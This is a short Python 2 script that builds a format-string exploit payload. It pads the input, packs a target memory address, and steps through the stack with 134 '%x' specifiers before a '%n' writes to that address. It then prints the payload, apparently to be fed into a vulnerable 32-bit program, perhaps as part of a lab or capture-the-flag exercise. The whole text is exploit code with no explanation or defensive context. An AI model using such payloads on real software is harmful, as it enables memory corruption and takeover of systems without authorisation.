payload = "AAAA"
payload += "\x38\x96\x04\x08"
payload += "BBBBB"
payload += "%x " *134
payload += "%n "
print payload

